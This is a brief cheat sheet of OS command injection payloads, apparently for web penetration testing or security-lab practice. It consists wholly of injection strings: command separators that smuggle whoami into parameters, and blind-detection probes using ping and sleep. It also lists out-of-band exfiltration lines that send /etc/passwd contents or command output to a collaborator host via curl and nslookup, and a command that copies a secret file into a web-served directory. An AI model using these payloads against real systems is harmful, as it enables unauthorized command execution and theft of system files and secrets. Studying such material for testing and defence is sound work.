# OS - Command Injection - CHEATSHEET 

## Cheat Sheet

``` bash
- Try in all params, e.g -> <bad-email> || <command>
- Find some path with write permissions 

| whoami
| err0r 
|| whoami ||
; whoami
` whoami
' whoami
" whoami
\n whoami
0x0a whoami
& whoami 
& er0rr 
&& whoami 

 -- BIND OS command injection --

|| ping -c 10 127.0.0.1 -> delay of 10 secs
|| ping -c 5 <INTERFACE> 
; sleep 5
|| whoami > <STATIC PATH> || 
|| whoami >> <STATIC PATH> || 
|| whoami > /var/www/static || 
|| /usr/bin/nslookup <IP> ||
|| nslookup `whoami` <IP> ||
|| nslookup $(whoami) <IP> ||
|| $(curl $(cat /etc/passwd).<IP-COLLABORATOR>) ||
||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
||cat+/home/carlos/secret>>/var/www/images/out.txt||

